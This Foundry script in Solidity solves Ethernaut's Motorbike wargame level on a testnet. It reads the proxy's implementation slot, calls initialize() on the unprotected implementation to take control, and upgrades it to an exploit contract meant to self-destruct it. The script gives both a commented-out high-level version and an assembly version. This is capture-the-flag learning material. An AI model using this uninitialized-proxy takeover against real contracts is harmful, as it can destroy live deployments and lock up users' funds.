// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import { console } from "forge-std/Script.sol";
import { EthernautScript } from "./Ethernaut.s.sol";

import { MotorbikeExploit } from "../../contracts/25_Motorbike.sol";

interface Instance {
    function upgrader() external view returns (address);

    function horsePower() external view returns (uint256);

    function initialize() external;

    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

/*
This level is a bit annoying.
We need to use `selfdestruct` but it currently doesn't work properly with Foundry
see here: https://github.com/foundry-rs/foundry/issues/1543
or this tweet: https://twitter.com/pcaversaccio/status/1605488735444905984

`selfdestruct` kills the contract only at the end of the transaction.
But since everything runs in a single transaction within our script, the contract isn't destroyed properly.

`setUp()` and `run()` are executed separately. So we'll include our exploit in the `setUp()` function,
and `run()` will just submit the level
*/
contract MotorbikeScript is EthernautScript {
    string network = "goerli";
    address level = 0x9b261b23cE149422DE75907C6ac0C30cEc4e652A;

    Instance instance;

    function setUp() public override {
        super.setUp();

        vm.createSelectFork(network);
        vm.startBroadcast(pk);

        instance = Instance(createLevelInstance(level, 0));
        console.log("-> instance:", address(instance));

        // baseVersion()
        //
        // Instance implementation = Instance(
        //     address(
        //         uint160(
        //             uint256(
        //                 vm.load(
        //                     address(instance),
        //                     bytes32(uint256(keccak256(abi.encodePacked("eip1967.proxy.implementation"))) - 1)
        //                 )
        //             )
        //         )
        //     )
        // );

        // address exploit = address(new MotorbikeExploit());
        // implementation.initialize();
        // implementation.upgradeToAndCall(exploit, abi.encodeWithSignature("exploit()"));

        // yulVersion()
        //
        bytes32 implementation = vm.load(
            address(instance),
            bytes32(uint256(keccak256(abi.encodePacked("eip1967.proxy.implementation"))) - 1)
        );

        bytes memory exploitCode = type(MotorbikeExploit).creationCode;
        assembly {
            let exploit := create(0, add(exploitCode, 0x20), mload(exploitCode))

            mstore(0, "exploit()")
            mstore(0, keccak256(0, 9))
            let exploitSelector := mload(0)

            mstore(0, "initialize()")
            mstore(0, keccak256(0, 12))
            let success := call(gas(), implementation, 0, 0, 4, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }

            let fmp := mload(0x40)
            mstore(fmp, "upgradeToAndCall(address,bytes)")
            mstore(fmp, keccak256(fmp, 31))
            mstore(add(fmp, 4), exploit)
            mstore(add(fmp, 0x24), 0x40)
            mstore(add(fmp, 0x44), 4)
            mstore(add(fmp, 0x64), exploitSelector)
            success := call(gas(), implementation, 0, fmp, 0x84, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }
        }
    }

    function run() public {
        submitLevelInstance(payable(address(instance)), level);
        vm.stopBroadcast();
    }
}
